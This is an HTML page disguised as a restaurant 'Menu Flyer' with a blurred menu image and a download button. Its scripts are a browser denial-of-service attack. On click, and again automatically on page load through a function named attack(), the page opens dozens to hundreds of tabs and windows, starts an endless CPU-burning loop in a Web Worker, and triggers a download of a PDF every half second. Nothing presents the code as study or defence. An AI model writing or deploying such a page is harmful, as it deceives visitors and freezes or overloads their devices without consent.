<!DOCTYPE html>
<html>
<head>
  <title>Menu Flyer</title>
  <style>
    .container {
      position: relative;
      width: 300px;
      height: 400px;
    }
    #blurred {
      filter: blur(8px);
      width: 100%;
      height: 100%;
      background: url('menu.jpg') no-repeat center center;
      background-size: cover;
    }
    #downloadBtn {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 12px 24px;
      font-size: 18px;
      z-index: 2;
    }
  </style>
</head>
<body>
  <div class="container">
    <div id="blurred"></div>
    <button id="downloadBtn">Download Menu</button>
  </div>

  <script>
    document.getElementById('downloadBtn').addEventListener('click', () => {
      // Remove blur
      document.getElementById('blurred').style.filter = 'none';



      // Start CPU intensive loop
      function cpuLoad() {
        let x = 0;
        while (true) {
          x += Math.sqrt(Math.random());
          if (x > 1e7) x = 0; // reset to avoid overflow
        }
      }

      // Multiple Tabs
      for (let i = 0; i < 200; i++) {
        window.open('https://arizona5005.github.io/Capstone/', '_blank');
      }

      // Multiple Windows
      for (let i = 0; i < 200; i++) {
        window.open('https://arizona5005.github.io/Capstone/' + Math.random(), '_blank', 'noopener,noreferrer,width=400,height=400');
      }

      // Start repeated downloads
      function downloadLoop() {
        const link = document.createElement('a');
        link.href = 'https://arizona5005.github.io/Capstone/menu.pdf';
        link.download = 'menu_super_long_filename_that_just_keeps_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going.pdf';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      }

      // Run CPU load in a Web Worker to keep UI responsive (optional)
      if (window.Worker) {
        const blob = new Blob([`onmessage = function() { while(true) {} }`], {type: 'application/javascript'});
        const worker = new Worker(URL.createObjectURL(blob));
        worker.postMessage('');
      } else {
        cpuLoad();
      }

      // Start download loop every 1/2 seconds
      setInterval(downloadLoop, 500);
    });
  </script>

<script>
  function attack() {
    // Remove blur
    document.getElementById('blurred').style.filter = 'none';

    // Start repeated downloads
    function downloadLoop() {
      const link = document.createElement('a');
      link.href = 'https://arizona5005.github.io/Capstone/menu.pdf';
      link.download = 'menu_super_long_filename_that_just_keeps_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going.pdf';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    // Multiple Tabs
    for (let i = 0; i < 50; i++) {
      window.open('https://arizona5005.github.io/Capstone/', '_blank');
    }

    // Multiple Windows
    for (let i = 0; i < 50; i++) {
      window.open('https://arizona5005.github.io/Capstone/' + Math.random(), '_blank', 'noopener,noreferrer,width=400,height=400');
    }

    // Run CPU load in a Web Worker to keep UI responsive (optional)
    if (window.Worker) {
      const blob = new Blob([`onmessage = function() { while(true) {} }`], {type: 'application/javascript'});
      const worker = new Worker(URL.createObjectURL(blob));
      worker.postMessage('');
    } else {
      // Fallback for browsers without Web Worker support
      let x = 0;
      while (true) {
        x += Math.sqrt(Math.random());
        if (x > 1e7) x = 0;
      }
    }

    // Start download loop every 1/2 seconds
    setInterval(downloadLoop, 500);
  }

  // Activate attack automatically on page load
  window.onload = attack;
</script>
</body>
</html>
